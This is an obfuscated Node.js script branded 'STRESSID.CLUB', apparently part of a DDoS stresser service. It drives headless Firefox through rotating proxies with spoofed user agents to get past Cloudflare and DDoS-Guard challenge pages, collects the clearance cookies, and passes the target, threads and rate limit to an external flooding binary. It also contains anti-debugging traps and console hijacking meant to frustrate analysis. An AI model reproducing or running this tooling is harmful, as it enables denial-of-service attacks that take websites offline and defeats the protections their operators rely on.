const fs = require('fs'),
  playwright = require('playwright-extra'),
  url = require('url'),
  colors = require('colors'),
  { spawn } = require('child_process')
require('events').EventEmitter.defaultMaxListeners = 0
;(function () {
  const _0x3a8628 = function () {
      let _0xd4d594
      try {
        _0xd4d594 = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x1201e9) {
        _0xd4d594 = window
      }
      return _0xd4d594
    },
    _0x2bd90c = _0x3a8628()
  _0x2bd90c.setInterval(_0x58ac63, 1)
})()
process.on('uncaughtException', function (_0xbe28d0) {})
process.argv.length < 9 &&
  (console.log(
    colors.rainbow('[STRESSID.CLUB]'),
    colors.red('URL Duration Proxy Ua Threads Ratelimit [optional: Strings]')
  ),
  process.exit(0))
async function main() {
  const _0x233f64 = (function () {
      let _0x518d48 = true
      return function (_0x1595c5, _0x5e7c6f) {
        const _0x9afe75 = _0x518d48
          ? function () {
              if (_0x5e7c6f) {
                const _0x2fdc2d = _0x5e7c6f.apply(_0x1595c5, arguments)
                return (_0x5e7c6f = null), _0x2fdc2d
              }
            }
          : function () {}
        return (_0x518d48 = false), _0x9afe75
      }
    })(),
    _0x527475 = (function () {
      let _0x21a6bb = true
      return function (_0x46c462, _0x3fda05) {
        const _0x3e0f5f = _0x21a6bb
          ? function () {
              if (_0x3fda05) {
                const _0x1d879e = _0x3fda05.apply(_0x46c462, arguments)
                return (_0x3fda05 = null), _0x1d879e
              }
            }
          : function () {}
        return (_0x21a6bb = false), _0x3e0f5f
      }
    })()
  const _0x2790eb = (function () {
    let _0xb55a5a = true
    return function (_0x294373, _0x58bd9a) {
      const _0x2b47af = _0xb55a5a
        ? function () {
            if (_0x58bd9a) {
              const _0x235d38 = _0x58bd9a.apply(_0x294373, arguments)
              return (_0x58bd9a = null), _0x235d38
            }
          }
        : function () {}
      return (_0xb55a5a = false), _0x2b47af
    }
  })()
  console.log(
    colors.rainbow('[STRESSID.CLUB]'),
    colors.red('Owner: @MSIDSTRESS | BROWSER')
  )
  const _0x6fad3b = process.argv[2],
    _0x5521cb = process.argv[3],
    _0x24e715 = process.argv[4],
    _0x27398f = process.argv[5],
    _0xc3c2b = process.argv[6],
    _0x4db244 = process.argv[7],
    _0x126978 = process.argv[8],
    _0x59a7d1 = fs.readFileSync(_0x27398f, 'utf-8').toString().split('\n'),
    _0x2606fc = fs
      .readFileSync(_0x24e715, 'utf-8')
      .toString()
      .replace(/\r/g, '')
      .split('\n')
      .filter((_0x2d9fae) => _0x2d9fae.trim().length > 0)
  let _0x5c311c = url.parse(_0x6fad3b).hostname
  var _0x1d9924 = []
  function _0x3b6586() {
    return _0x59a7d1[Math.floor(Math.random() * _0x59a7d1.length)]
  }
  function _0xbe910d() {
    const _0x393ebf = _0x2606fc[Math.floor(Math.random() * _0x2606fc.length)]
    return _0x2606fc.remove(_0x393ebf), _0x393ebf
  }
  Array.prototype.remove = function () {
    var _0x3eb486,
      _0x499550 = arguments,
      _0x13cee2 = _0x499550.length,
      _0x3538dc
    while (_0x13cee2 && this.length) {
      _0x3eb486 = _0x499550[--_0x13cee2]
      while ((_0x3538dc = this.indexOf(_0x3eb486)) !== -1) {
        this.splice(_0x3538dc, 1)
      }
    }
    return this
  }
  async function _0xd68eb1() {
    const _0x4f07f8 = _0x233f64(this, function () {
      return _0x4f07f8
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x4f07f8)
        .search('(((.+)+)+)+$')
    })
    _0x4f07f8()
    ;(function () {
      _0x527475(this, function () {
        const _0x19fd09 = new RegExp('function *\\( *\\)'),
          _0x47ae20 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
          _0x2a6e8f = _0x58ac63('init')
        if (
          !_0x19fd09.test(_0x2a6e8f + 'chain') ||
          !_0x47ae20.test(_0x2a6e8f + 'input')
        ) {
          _0x2a6e8f('0')
        } else {
          _0x58ac63()
        }
      })()
    })()
    const _0x2a2a9d = _0x2790eb(this, function () {
      let _0x481d43
      try {
        const _0xe98006 = Function(
          'return (function() {}.constructor("return this")( ));'
        )
        _0x481d43 = _0xe98006()
      } catch (_0x212fbc) {
        _0x481d43 = window
      }
      const _0x66e43f = (_0x481d43.console = _0x481d43.console || {}),
        _0x523693 = [
          'log',
          'warn',
          'info',
          'error',
          'exception',
          'table',
          'trace',
        ]
      for (let _0x28f270 = 0; _0x28f270 < _0x523693.length; _0x28f270++) {
        const _0x3bc90e = _0x2790eb.constructor.prototype.bind(_0x2790eb),
          _0x32ed6a = _0x523693[_0x28f270],
          _0x1ba43f = _0x66e43f[_0x32ed6a] || _0x3bc90e
        _0x3bc90e['__proto__'] = _0x2790eb.bind(_0x2790eb)
        _0x3bc90e.toString = _0x1ba43f.toString.bind(_0x1ba43f)
        _0x66e43f[_0x32ed6a] = _0x3bc90e
      }
    })
    _0x2a2a9d()
    try {
      const _0x1d5e54 = _0x3b6586(),
        _0x40029c = _0xbe910d(),
        _0x4152d7 = {
          urls: _0x6fad3b,
          proxoid: _0x40029c,
          useragents: _0x1d5e54,
        }
      solving(_0x4152d7)
        .then((_0x3077b4, _0x1c7e50) => {
          let _0x1c606f = '',
            _0x29c010 = JSON.stringify(_0x3077b4)
          _0x29c010 = JSON.parse(_0x29c010)
          _0x29c010.forEach((_0x2a71a7) => {
            const _0x203eca = _0x2a71a7.name + '=' + _0x2a71a7.value + ';'
            _0x1c606f += _0x203eca
          })
          const _0x21f6ef = {
            urls: _0x6fad3b,
            proxoid: _0x40029c,
            useragents: _0x1d5e54,
          }
          _0x1d9924.push(_0x21f6ef)
          console.log(
            colors.rainbow('[STRESSID.CLUB]'),
            'User-Agent: ' + _0x1d5e54
          )
          console.log(colors.rainbow('[STRESSID.CLUB]'), 'Cookie: ' + _0x1c606f)
          post(
            _0x6fad3b,
            _0x40029c,
            _0x5c311c,
            _0x1d5e54,
            _0x5521cb,
            _0x1c606f,
            _0xc3c2b,
            _0x4db244,
            _0x126978
          )
        })
        .catch((_0x6d5715) => {
          try {
            _0xd68eb1()
          } catch (_0x4317ba) {}
        })
    } catch (_0x41700d) {}
  }
  for (let _0x112c94 = 0; _0x112c94 < _0xc3c2b; _0x112c94++) {
    console.log(
      colors.rainbow('[STRESSID.CLUB]'),
      'Create session: #' + _0x112c94
    )
    _0xd68eb1()
  }
}
main()
function solving(_0x1dbc84) {
  return new Promise((_0x32783b, _0x32f93c) => {
    console.log(
      colors.rainbow('[STRESSID.CLUB]'),
      'Proxy added: ' + _0x1dbc84.proxoid
    )
    const _0x1a291e = {
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--viewport-size 1920, 1080',
        '--enable-automation',
        '--disable-blink-features',
        '--disable-blink-features=AutomationControlled',
        '--hide-scrollbars',
        '--mute-audio',
        '--disable-canvas-aa',
        '--disable-2d-canvas-clip-aa',
        '--ignore-certificate-errors',
        '--ignore-certificate-errors-spki-list',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-gpu',
        '--disable-sync',
        '--disable-plugins',
        '--disable-plugins-discovery',
        '--disable-preconnect',
        '--disable-notifications',
        '--no-startup-window',
        '--enable-monitor-profile',
        '--no-remote',
        '--wait-for-browser',
        '--foreground',
        '--juggler-pipe',
        '--silent',
      ],
    }
    playwright.firefox.launch(_0x1a291e).then(async (_0x4c427c) => {
      const _0xe1c9f4 = { userAgent: _0x1dbc84.useragents }
      const _0x125abb = await _0x4c427c.newPage(_0xe1c9f4),
        _0x219e76 = {
          width: 1920,
          height: 1080,
        }
      await _0x125abb.setViewportSize(_0x219e76)
      try {
        const _0x4cb561 = await _0x125abb.goto(_0x1dbc84.urls)
      } catch (_0x43e802) {
        _0x32f93c(_0x43e802)
        await _0x4c427c.close()
      }
      try {
        const _0x4f9400 = { waitUntil: 'networkidle0' }
        await _0x125abb.waitForTimeout(15000, _0x4f9400)
        const _0x2b3ac2 = await _0x125abb.title()
        _0x2b3ac2 == 'Just a moment...' && (await _0x4c427c.close())
        _0x2b3ac2 == 'DDOS-GUARD' && (await _0x4c427c.close())
        const _0x3e2fb5 = await _0x125abb.context().cookies()
        if (_0x3e2fb5) {
          _0x32783b(_0x3e2fb5)
          await _0x4c427c.close()
          return
        }
      } catch (_0x11a846) {
        _0x32f93c(_0x11a846)
        await _0x4c427c.close()
      }
    })
  })
}
function post(
  _0x33eb4d,
  _0x19cb42,
  _0x78f8cd,
  _0x211000,
  _0x46c7d8,
  _0x427dcf,
  _0xbf7f79,
  _0x2899a5,
  _0x18c099
) {
  let _0x4ba1c5 = new Promise((_0x589f1e, _0x252e77) => {
    const _0x9e9a46 = spawn('./XYU', ['хуй а не леак'])
    _0x9e9a46.stdout.on('data', (_0x7727af) => {
      return _0x589f1e()
    })
  })
}
function _0x58ac63(_0x3d228c) {
  function _0xc22f31(_0x324433) {
    if (typeof _0x324433 === 'string') {
      return function (_0x25e4ba) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x324433 / _0x324433).length !== 1 || _0x324433 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0xc22f31(++_0x324433)
  }
  try {
    if (_0x3d228c) {
      return _0xc22f31
    } else {
      _0xc22f31(0)
    }
  } catch (_0xb61491) {}
}
